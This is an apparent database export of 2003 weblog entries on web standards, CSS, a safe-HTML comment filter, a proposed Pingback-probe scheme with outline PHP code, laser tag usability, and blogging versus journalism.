&lt;p&gt;I learnt how to set it up from &lt;a href=&quot;http://www.mindrot.org/~djm/auug2002/ssh-tutorial.pdf&quot; title=&quot;SSH tips, tricks &amp;amp; protocol tutorial&quot;&gt;this PDF file&lt;/a&gt; (well, actually the &lt;a href=&quot;http://216.239.51.100/search?q=cache:mWgP_JFucbEC:www.mindrot.org/~djm/auug2002/ssh-tutorial.pdf+ssh+tricks+pdf&amp;amp;hl=en&amp;amp;ie=UTF-8&quot; title=&quot;View PDF as HTML&quot;&gt;Google HTML conversion&lt;/a&gt;). &lt;a href=&quot;http://www.chiark.greenend.org.uk/~sgtatham/putty/&quot;&gt;PuTTY&lt;/a&gt; on Windows has the same capability but needs to be set up in a very different way - information on that can be found in the &lt;a href=&quot;http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter8.html#8&quot; title=&quot;Chapter 8: Using public keys for SSH authentication&quot;&gt;excellent PuTTY documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I'm probably the last person on earth to cotton on to this, but it's so neat I just &lt;em&gt;had&lt;/em&gt; to share.&lt;/p&gt;</field>
		<field name="created">2003-02-20 18:38:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">784</field>
		<field name="title">Slow professional suicide</field>
		<field name="slug">slowProfessionalSuicide</field>
		<field name="body">&lt;p&gt;Al Sparber &lt;a href=&quot;http://www.projectseven.com/grafitti/clarence0602/index.htm&quot; title=&quot;Clarence the Pony&quot;&gt;makes perfect sense&lt;/a&gt; in article from June last year:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.projectseven.com/grafitti/clarence0602/index.htm&quot;&gt;
&lt;p&gt;There's nothing inherently wrong with using tables to layout a web page. They are great for rapidly deployment sites for clients who need to support a wide range of older browsers, or in any site that needs to display organized tabular data. Tables are not evil. But in terms of web page design, nothing is absolute. The target is constantly moving... but not in circles. To only use tables is as wrong a decision as to never use tables. Not to embrace CSS, could be tantamount to a slow professional suicide.&lt;/p&gt;

&lt;p&gt;Web design is like medicine. Successful doctors are the ones who keep up with the latest techniques. You wouldn't want to go to a doctor who doesn't know the latest imaging and non-invasive surgical methods. I wouldn't hire a web designer who couldn't wax poetic about CSS, W3C Standards, Accessibility, and Usability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Al has just started a very promising tutorial series on CSS Layouts: &lt;a href=&quot;http://www.projectseven.com/grafitti/jan2003/cssdirect.htm&quot;&gt;Woven with CSS: Quick Draw MacFly&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-02-23 13:06:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">785</field>
		<field name="title">Safe HTML checker</field>
		<field name="slug">safeHtmlChecker</field>
		<field name="body">&lt;p&gt;I've finally enabled a subset of &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in my comments. In doing so, I had several requirements that needed to be fulfilled:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Entered markup must be valid to &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; strict, to stop comments form breaking validation and keep things nice and tidy.&lt;/li&gt;
 &lt;li&gt;No presentational markup! I want to maintain control over how things look via my stylesheets - comments posted should only be able to use structural &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; elements.&lt;/li&gt;
 &lt;li&gt;Attributes should be restricted to those that add semantic meaning. Javascript event attributes and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; related attributes should not be allowed.&lt;/li&gt;
 &lt;li&gt;I should retain full control over the tags and attributes allowed in the comments.&lt;/li&gt;
 &lt;li&gt;Submitted &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; must be kept free from anything that could pose a security risk, such as &lt;code&gt;javascript:&lt;/code&gt; &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The system I have implemented works by running submitted posts through an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser, which checks that each element is in my list of allowed elements, is nested correctly (you can't put a &lt;code&gt;blockquote&lt;/code&gt; inside a &lt;code&gt;p&lt;/code&gt; for example) and doesn't have any illegal attributes. My initial test have shown it to work pretty well, but if anyone wants to have a go at breaking it please, be my guest.&lt;/p&gt;

&lt;p&gt;The code for the main class is available here: &lt;a href=&quot;/code/php/SafeHtmlChecker.class.php.txt&quot;&gt;SafeHtmlChecker.class.php&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2003-02-23 15:04:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">786</field>
		<field name="title">Mail models</field>
		<field name="slug">mailModels</field>
		<field name="body">&lt;p&gt;Matthew Thomas offers a &lt;a href=&quot;http://mpt.phrasewise.com/2003/02/21#a466&quot; title=&quot;Mail models, part 1&quot;&gt;fascinating example&lt;/a&gt; of usability gone horribly wrong (the explanation is &lt;a href=&quot;http://mpt.phrasewise.com/2003/02/24#a470&quot; title=&quot;Mail models, part 2&quot;&gt;provided here&lt;/a&gt;). Incidentally, while showing the above to my girlfriend she uncovered an interesting usability issue on Matthew's site itself -  &quot;is this a collaborative weblog then?&quot; she asked, having spotted the &lt;q cite=&quot;http://mpt.phrasewise.com/2003/02/24#a470&quot;&gt;Posted by &lt;a href=&quot;http://mpt.phrasewise.com/profiles/$mpt@myrealbox.com&quot;&gt;mpt&lt;/a&gt; on 2/24/03; 3:51:24 AM&lt;/q&gt; text below the entry. Clicking on the name link provided no extra information, bringing up a screen with no useful content at all. I imagine this is an issue with the &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; powering the blog, but it does neatly demonstrate how some &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; features can detract from the unserstandibility of a site.&lt;/p&gt;</field>
		<field name="created">2003-02-23 20:16:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">787</field>
		<field name="title">Browser detection reconsidered</field>
		<field name="slug">browserDetectionReconsidered</field>
		<field name="body">&lt;p&gt;Leonard Lin on &lt;a href=&quot;http://randomfoo.net/?p=2003_02_23_archive.inc#90365326&quot;&gt;The Folly of Depending on CSS Parsing Bugs&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://randomfoo.net/?p=2003_02_23_archive.inc#90365326&quot;&gt;
&lt;p&gt;I would not compensate for CSS rendering bugs by exploiting CSS parsing bugs except as a last resort. Think about it from a standardized test perspective: what strong relation does CSS rendering bugs have with CSS parsing bugs? There's no reason (nor right!) to assume that all future browsers with the same rendering bugs will have the same parsing bugs (and vice versa). In fact, if you look at the recent past releases (Safari, Opera, IE), even within browser families you'll see that this is absolutely not true!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;He has an interesting point - user agent sniffing, while derided by many, is at least predictable in that you can deliberately target specific versions of specific browsers (as long as you're careful not to feed a user-agent cloaked Opera something nasty by mistake). &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; hacks may target browsers based purely on their capabilities (which cannot be cloaked by a false user agent string) but require careful maintenance against future version changes - as with Safari which has &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/archives/2003_02.html#002553&quot; title=&quot;Safari Newsflash: CSS Parser Integrated&quot;&gt;fixed some CSS parsing errors&lt;/a&gt; that were being used to filter Safari specific styles.&lt;/p&gt;

&lt;p&gt;I suppose it boils down to the question of which is easier to maintain - a site-wide stylesheet (or two) with hacks in vs a server side (I'll ignore client side as it's even uglier) browser detection routine to serve up the right stylesheet. Either way, if you don't have a full set of browsers and platforms to test on the best you can do is cross your fingers and pray nothing breaks.&lt;/p&gt;

&lt;p&gt;Of course, this issue is true of table layouts as well. Who knows, maybe in about 5 years time the browsers will have caught up with the current set of standards (and we'll all be stressing over how much of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;3 we can use without the house of cards tumbling back down again).&lt;/p&gt;</field>
		<field name="created">2003-02-24 12:07:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">788</field>
		<field name="title">Pingback redux</field>
		<field name="slug">pingbackRedux</field>
		<field name="body">&lt;p&gt;I think I've worked out a way of implementing &lt;a href=&quot;http://www.hixie.ch/specs/pingback/pingback&quot; title=&quot;Pingback 1.0&quot;&gt;Pingback&lt;/a&gt; (or a Pingback-like system) without any need for &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt;, &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; elements or custom &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; headers.&lt;/p&gt;

&lt;p&gt;There are three principle reasons for using Pingback to &quot;detect&quot; a link to a page rather than relying on referrals:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;A referral from a blog is likely to come from that blog's front page, whereas any link back to that content should target the permalink of the specific entry from which the incoming link was made.&lt;/li&gt;
 &lt;li&gt;Pingbacks are deliberate - they show that the source of the Pingback is a deliberate response to the linked item and wishes to be listed as such.&lt;/li&gt;
 &lt;li&gt;It is possible (although unlikely) for a link to remain undetected simply because that link has never been &quot;clicked&quot; by anyone.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Pingback solves these problems through &quot;alert me if you link to me information&quot; embedded in the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; headers / embedded metadata of a page, combined with a simple &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; server for accepting alerts. While this solves the problems outlined above, the overhead of carrying out a Pingback is quite large and the implementation of the client / server is quite challenging. The system is also of no use at all unless both parties have Pingback installed.&lt;/p&gt;

&lt;p&gt;My solution is an extension of my own Pingback implementation. Whenever I link to a site from my blog, a script running on my server requests each of the pages I have linked to and checks for information on a related Pingback server (this is standard behaviour for any &lt;a href=&quot;http://www.hixie.ch/specs/pingback/pingback#TOC4&quot; title=&quot;Pingback 1.0: Conformance Requirements&quot;&gt;conformant Pingback client&lt;/a&gt;). As a nod towards those users who do not have Pingback enabled, the script sends the permalink of the linking item as the &lt;code&gt;Referer&lt;/code&gt; header, to ensure that their logs have at least one hit from the entry in question. It dawned upon me that if this single &quot;hit&quot; was identifiable as a Pingback probe the process could stop there - the target server would have the required information that &quot;Page X linked to Page Y at Time T&quot; and would be able to process the Pingback straight away. How to identify the hit? Two methods come to mind - the request could include an additional header (&lt;code&gt;X-Pingback-Probe: yes&lt;/code&gt;) or the User-Agent string could include some standard string. Since some scripting languages (such as &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;) do not provide access to non-standard headers in the &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; request, the second option seems immediately favourable.&lt;/p&gt;

&lt;p&gt;Here is some outline &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; code for spotting and responding to my proposed &quot;pingback-probe&quot; requests:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
if (isset($_SERVER['HTTP_REFERER']) &amp;amp;&amp;amp; 
    $strpos($_SERVER['HTTP_USER_AGENT'], 'pingback-probe') !== false) {
    // User Agent contains 'pingback-probe' and referer information is present
    $linkFrom = $_SERVER['HTTP_REFERER']
    $linkTo = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    if ($info = checkPingback($linkFrom, $linkTo)) {
        addPingback($linkFrom, $linkTo, $info['title'], $info['extract']);
    }
}

function checkPingback($linkFrom, $linkTo) {
    /* This function loads the $linkFrom page and checks that it really does 
       contain a link to $linkTo. If not, it returns false. If the link exists,
       it grabs the title of the page and an extract of text found surrounding 
       the $linkTo link and returns them in a small associative array. */
}

function addPingback($linkFrom, $linkTo, $title, $extract) {
    /* This function saves the pingback information, presumable by logging it 
       to a file or saving it to a database. It would almost certainly save 
       the time the Pingback was received as well. */
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pingback client implementations would say similar to the way they work now, except instead of having to retrieve the target page, check for Pingback server information and send an &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; ping they would just have to send a single request with the specified referral and user agent information. Implementation is thus simpler for both client and server sides of the system, while keeping the required functionality.&lt;/p&gt;
</field>
		<field name="created">2003-02-24 16:53:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">789</field>
		<field name="title">Doing forms justice</field>
		<field name="slug">doingFormsJustics</field>
		<field name="body">&lt;p&gt;Dan Loda:  &lt;a href=&quot;http://www.webweaver.org/dan/css/cssforms.html&quot;&gt;Doing forms justice&lt;/a&gt;. A demonstration of how labels, accesskeys, fieldsets and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can make a form that's usable, accessible and looks great. He even uses an optgroup in a select box, an element I've never seen demonstrated before.&lt;/p&gt;</field>
		<field name="created">2003-02-25 19:07:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">790</field>
		<field name="title">PHP5 Preview</field>
		<field name="slug">php5Preview</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;http://www.phpvolcano.com/eide/php5.php?page=front&quot;&gt;great preview&lt;/a&gt; describing the features we have to look forward to in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5. Proper object reference handling is going to be sweet.&lt;/p&gt;</field>
		<field name="created">2003-02-27 23:33:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">791</field>
		<field name="title">Quasar usability</field>
		<field name="slug">quasarUsability</field>
		<field name="body">&lt;p&gt;I had my first ever Quasar (otherwise known as laser tag) experience last night with the Bath University Computer Science Society (&lt;acronym title=&quot;Bath Computer Science Society&quot;&gt;BCSS&lt;/acronym&gt;). Due to various misunderstandings our booking failed to materialise, but Quasar were very nice and said we could play against another group at 7.30pm. They failed to mention that the other group had an average age of about 9. Suffice to say it was an entertaining match, which we won by a very small margin (little kids spend all day running about; lazy students don't).&lt;/p&gt;

&lt;p&gt;Although it was good fun, the first ten minutes of the match were marred by our complete confusion as to what we were meant to do and how we could do it. &quot;Shoot people on the other team and try to shoot their command centre&quot; is a clear enough objective, but the overall user experience left a lot to be desired. Seeing as 10% of the male population are red-green  colour blind, red and green are questionable choices for team colours (one friend with this problem could only really tell the difference thanks to the enemy team being about half our height). The interface on the guns was very poor as well - important messages were conveyed by an electronic voice, which was practically inaudible in the loud environment of the game area, and the display on the back proved extremely confusing. The guns have a small digital readout which displays your number of lives and remaining ammo. When you are hit (making your gun inactive for 2-3 seconds) the display changes to a rapidly reducing counter to show that you are unable to shoot. Of course, this also means that while you are recovering you can't tell how many lives you have left making it impossible to judge whether or not you should head back to base for a recharge.&lt;/p&gt;

&lt;p&gt;The other features of the gun, such as the &quot;special weapon&quot; switch on the front (which appeared to change the noise the gun made) and the powerups hidden around the map were completely lost on me as I spent most of my time desperately trying to figure out if I was dead or not.&lt;/p&gt;

&lt;p&gt;Despite the interface nightmare, it was great fun. We beat our half-sized oponents by an embaressingly small margin, and stumbled out after 20 minutes looking and feeling like we'd just been through a two hour intensive session in the gym. Hopefully next time we'll be up against a team with a bit less of a height advantage :)&lt;/p&gt;

</field>
		<field name="created">2003-02-27 23:52:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">792</field>
		<field name="title">Blogging and journalism</field>
		<field name="slug">bloggingAndJournalism</field>
		<field name="body">&lt;p&gt;I've been pretty much ignoring the whole &quot;Blogging vs Journalism&quot; thing but recently I've begun to understand what the big fuss is about. One of the most popular arguments put forth by journalists concerned by competition from blogs is that the information contained therein isn't as reliable thanks to a lack of an editor to check facts. &lt;em&gt;Rubbish&lt;/em&gt;. I can't remember the last time I read a technology article in the main stream press about something I have more than a passing interest in that didn't have at least a few errors. Some of the blogs I read on the other hand are written by subject matter &lt;em&gt;experts&lt;/em&gt; - these people are not being paid to knock out 750 vaguely relevant words on a breaking story, they are voluntarily providing their insights because they are heavily involved with the topic at hand.&lt;/p&gt;

&lt;p&gt;When Safari came out, who had the best coverage? Look no further than &lt;a href=&quot;http://diveintomark.org/archives/2003/01/07/safari_review.html&quot; title=&quot;Safari review&quot;&gt;Mark Pilgrim&lt;/a&gt;. The Eldred case was graced with coverage by &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/&quot;&gt;Lawrence Lessig&lt;/a&gt;, the man at the very centre of the story. I'm sure there are plenty of other examples.&lt;/p&gt;

&lt;p&gt;So, for a lot of tech related news I find blogs a far more useful source of information than the mainstream press. The problem of course is one of reputation - before I can judge the value of a blog entry I need to know something about the blogger who wrote it. Part of this judgement is helped by links from bloggers who I already trust (the linking nature of the web at work). Unlike &lt;a href=&quot;http://tantek.com/log/2003/02.html#media20030228t1057&quot; title=&quot;Media&quot;&gt;Tantek&lt;/a&gt; I still have a use for traditional media for my non-tech news, but as the blogosphere expands and new methods evolve for finding quality blogs on a variety of subject matter I can see my dependence on the media reducing even more.&lt;/p&gt;
</field>
		<field name="created">2003-02-28 23:42:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">793</field>
		<field name="title">Problems in Nirvana</field>
		<field name="slug">problemsInNirvana</field>
		<field name="body">&lt;p&gt;Simon Phipp is Chief Technology Evangelist at Sun, and recently participated as a speaker on the &quot;.NET Nirvana&quot; &lt;a href=&quot;http://www.geekcruises.com/&quot;&gt;Geek Cruise&lt;/a&gt;. His &lt;a href=&quot;http://www.webmink.net/2003_02_16_oldblog.htm#90352127&quot; title=&quot;Webmink: the blog&quot;&gt;blog entries covering the event&lt;/a&gt; make interesting reading. To cut a long story short, after a couple of presentations on Java web services and open source coftware the Microsoft contingent at the event requested that he be barred from attending an evening Q &amp;amp; A. Simon makes the following observation:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.webmink.net/2003_02_16_oldblog.htm#90352127&quot;&gt;&lt;p&gt;
But the more I think about it, the more it resonates with what I have read in books like 'Hard Drive' about Microsoft's ethos being one of 'Win at all costs, and they are all out to get us'. It seems the automatic assumption of some of the other speakers was that I was in some way 'out to get' Microsoft, that my agenda was attack, so despite that being absent from my intent it was read in as a sub-text to what I said. Considering that the people involved represent the attitudes of the largest, most aggressive company in my industry, immune from almost every attack and even able to shrug off conviction under the Sherman Act like a speeding ticket from a small-town cop, they showed a vulnerablity and insecurity which speaks volumes of the way Microsoft likes its people to feel and act. I stand educated.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-02-28 23:53:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">794</field>
		<field name="title">Vector search engines</field>
		<field name="slug">vectorSearchEngines</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.perl.com/pub/a/2003/02/19/engine.html&quot;&gt;Building a Vector Space Search Engine in Perl&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.perl.com/pub/a/2003/02/19/engine.html&quot;&gt;
&lt;p&gt;Vector-space search engines use the notion of a &lt;strong&gt;term space&lt;/strong&gt;, where each document is represented as a vector in a high-dimensional space. There are as many dimensions as there are unique words in the entire collection. Because a document's position in the term space is determined by the words it contains, documents with many words in common end up close together, while documents with few shared words end up far apart.&lt;/p&gt;

&lt;p&gt;To search our collection, we project a query into this term space and calculate the distance from the query vector to all the document vectors in turn. Those documents that are within a certain threshold distance get added to our result set. If all this sounds like gobbledygook to you, then don't worry - it will become clearer when we write the code.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Having done a course on Linear Algebra last term, it's interesting to see how it can be applied to the search problem. The technique described lends itself well to finding &quot;similar documents&quot; as well, as documents with similar word content will end up &quot;near&quot; to each other when projected on to the vector space.&lt;/p&gt;

&lt;p&gt;The article is also yet another demonstration of how Perl's modules make it such a powerful tool.  Lingua::Stem is used to find word &quot;stems&quot;, providing a free algorithm for eliminating related words like cat and cats. The performance overhead of using Perl arrays to represent large vectors is avoided with the &lt;acronym title=&quot;Perl Data Language&quot;&gt;PDL&lt;/acronym&gt; module, which implements a whole set of matrix algebra functions in compiled C for high performance. Without these two modules the technique described would be a great deal less powerful. Of course, neither of them are available for &lt;acronym title=&quot;PHP: HyperText Preprocessor&quot;&gt;PHP&lt;/acronym&gt; or Python, my scripting languages of choice.&lt;/p&gt;
</field>
		<field name="created">2003-03-01 13:07:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">795</field>
		<field name="title">An interview with Cory</field>
		<field name="slug">interviewWithCory</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.oreillynet.com/pub/a/policy/2003/02/24/perspectives.html&quot; title=&quot;Internet Perspectives Cory Doctorow&amp;apos;s Bitchun&amp;apos; World: P2P Gone Wild&quot;&gt;An interview with Cory Doctorow&lt;/a&gt;, via &lt;a href=&quot;http://randomfoo.net/?p=2003_02_23_archive.inc#90392146&quot;&gt;Leonard&lt;/a&gt;. Provides some great background insight in to the world described in &lt;a href=&quot;http://randomfoo.net/?p=2003_02_23_archive.inc#90392146&quot; title=&quot;Down and Out in the Magic Kingdom&quot;&gt;Down and Out&lt;/a&gt;, along with Cory's thoughts on such topics as the recording industry and the Disney corporation.&lt;/p&gt;</field>
		<field name="created">2003-03-01 14:06:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">796</field>
		<field name="title">Dependencies suck</field>
		<field name="slug">dependenciesSuck</field>
		<field name="body">&lt;pre&gt;&lt;code&gt;
[root@miskatonic tmp]# rpm -i mplayer-gui-0.90rc4-2.i386.rpm 
error: failed dependencies:
	mplayer-skin is needed by mplayer-gui-0.90rc4-2
[root@miskatonic tmp]# rpm -i mplayer-skin-default-1.6-3.noarch.rpm 
error: failed dependencies:
	mplayer-gui is needed by mplayer-skin-default-1.6-3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Sigh&lt;/em&gt;. I guess I'll stick with the console version.&lt;/p&gt;</field>
		<field name="created">2003-03-02 14:47:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">797</field>
		<field name="title">Creative commons query</field>
		<field name="slug">creativeCommonsQuery</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.aaronsw.com/weblog/000850&quot; title=&quot;Trip Report&quot;&gt;Aaron Swartz&lt;/a&gt; has been talking to Google about indexing &lt;a href=&quot;http://creativecommons.org/&quot;&gt;Creative Commons&lt;/a&gt; licensed works:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.aaronsw.com/weblog/000850&quot;&gt;&lt;p&gt;
From Google the news was mixed. He said he wouldn’t start indexing .0 URIs, which includes the URIs for all our licenses. He also said that he wouldn’t parse RDF for at least six months, since it required involved changes to their system and added overhead (which you need to keep down when parsing 3B pages). However, he did say that if we added &amp;lt;meta&amp;gt; tags for license information, they’d add a new search key like link: or inurl: right away, since they already had a meta tag parser.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Did they say anything about &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/19/#creativeCommonsCopyrightLink&quot;&gt;using the link element&lt;/a&gt; instead?&lt;/p&gt; 
</field>
		<field name="created">2003-03-02 23:34:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">798</field>
		<field name="title">The importance of titles</field>
		<field name="slug">theImportanceOfTitles</field>
		<field name="body">&lt;p&gt;Gordon Weakliem &lt;a href=&quot;http://radio.weblogs.com/0106046/2003/03/03.html#a239&quot;&gt;reminds us&lt;/a&gt; that the most important RSS element is &lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;. I'm painfully reminded of this each and every time I add a new entry - I have well over 800 entries now, and I've promised myself that next time I perform a major upgrade on this blog I'm going to go through and manually add titles to every single one. The task should be made slightly easier by the camelCase permalinks, which I can convert in to &quot;suggested&quot; titles to help the task along. It's still not going to be much fun though.&lt;/p&gt;</field>
		<field name="created">2003-03-03 23:08:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">799</field>
		<field name="title">Sitepoint redesigns</field>
		<field name="slug">sitepointRedesigns</field>
		<field name="body">&lt;p&gt;I don't know how I missed it, but &lt;a href=&quot;http://www.sitepoint.com/&quot;&gt;SitePoint&lt;/a&gt; have redesigned in funky valid structural &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. I quite like the new look (not so keen on the new logo though) and the navigation is definitely a huge improvement - instead of the previous confusing arangement of several &quot;sister&quot; sites they now divide content in to &quot;Articles&quot; and &quot;Forums&quot;, which makes a lot more sense. They have some clever &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; enhancements as well, such as a collapsible left hand navigation panel. The right hand navigation that scrolls up and down (jerkily) with the window is quite distracting unfortunately. &lt;/p&gt;

&lt;p&gt;The reaction on the &lt;a href=&quot;http://www.sitepointforums.com/&quot;&gt;forums&lt;/a&gt; has been mixed, with a lot of people declaring their preference for the old design. Personally I think it's great to see such a useful web master resource embracing the next generation of standards compliant web design.&lt;/p&gt;</field>
		<field name="created">2003-03-03 23:52:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">800</field>
		<field name="title">Mozilla for bloggers</field>
		<field name="slug">mozillaForBloggers</field>
		<field name="body">&lt;p&gt;Matthew Haughey (&lt;a href=&quot;http://a.wholelottanothing.org/archives.blah/005800&quot; title=&quot;Adventures in redesigns&quot;&gt;freshly redesigned&lt;/a&gt;) has published a &lt;a href=&quot;http://a.wholelottanothing.org/more.blah/moreID/18&quot; title=&quot;Mozilla: Blogging&amp;apos;s Killer App&quot;&gt;Mozilla advocacy article&lt;/a&gt; explaining why Mozilla (and variants) are excellent tools for bloggers. Spot on.&lt;/p&gt;</field>
		<field name="created">2003-03-04 23:22:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">801</field>
		<field name="title">BCSS</field>
		<field name="slug">BCSS</field>
		<field name="body">&lt;p&gt;Here's the reason I've been blogging at a relatively low frequency lately: &lt;a href=&quot;http://www.bcss.info/&quot;&gt;BCSS - the Bath University Computer Science Society&lt;/a&gt;. The site is still under heavy development (there's a surprise) but there's enough information there now for it to be worth linking to. At the moment the site is valid &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4.01 Strict but it works as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; as well (try appending &lt;code&gt;?xhtml=1&lt;/code&gt; to the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; of any page on the site) thanks to an ultra flexible page template class (&lt;a href=&quot;http://simon.incutio.com/archive/2003/02/15/#classesForPages&quot; title=&quot;Archive, 15th February&quot;&gt;outlined here&lt;/a&gt;) and a few simple tricks to convert &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; in to &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; beforethe page is displayed.&lt;/p&gt;

&lt;p&gt;Enough web geekery, I should probably explain a few things about the society itself. We initally formed a few weeks before Christmas, but due to coursework deadlines, the Christmas break, exam revision and exams were unable to sort much out until about a month ago. Our aim is to &quot;fill the gaps&quot; in the Computer Science degree courses provided by the University of Bath. While the official courses provide an excellent theoretical background for &lt;acronym title=&quot;Computer Science&quot;&gt;CS&lt;/acronym&gt; students, no University course could possibly hope to keep up with the lastest developments in our fast moving industry. We plan to provide student-run activities that complement the course, such as seminars on topics like &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;, Web Services, &lt;acronym title=&quot;Java 2 Enterprise Edition&quot;&gt;J2EE&lt;/acronym&gt; and .NET, training courses in different programming languages and talks from invited speakers on hot topics in Computer Science.&lt;/p&gt;

&lt;p&gt;That's the long term plan at any rate. For the moment, we're just trying to get established, sign up some members and get some experience at running things. Our first undertaking is a &lt;a href=&quot;http://www.bcss.info/courses/cplusplus/&quot;&gt;introductory C++ course&lt;/a&gt; run by Tristan Caulfield, which got off to a good start on Monday and will be followed by a course on graphics programming with Direct 3D. We're also on the look out for a relatively high profile open source developer in the Bath/Bristol area willing to come in and give a presentation on the Open Source development model (it's scary the number of people on our course with little or no understanding of the Open Source ethic). Any suggestions for a candidate would be more than welcome :)&lt;/p&gt;</field>
		<field name="created">2003-03-04 23:45:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">802</field>
		<field name="title">HTTP status codes</field>
		<field name="slug">httpStatusCodes</field>
		<field name="body">&lt;p&gt;Craig Saila &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_03_02_archive.shtml#90120819&quot; title=&quot;Living Can Kill You: Tuesday, March 04, 2003&quot;&gt;has a minor rant&lt;/a&gt; about &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; error codes. Did you know that &lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.4.11&quot; title=&quot;HTTP/1.1 Status Code Definitions: 410 Gone&quot;&gt;a 410 should be served instead of a 404&lt;/a&gt; when a resource has been deliberately, permanently removed? I didn't.&lt;/p&gt;</field>
		<field name="created">2003-03-04 23:52:08</field>
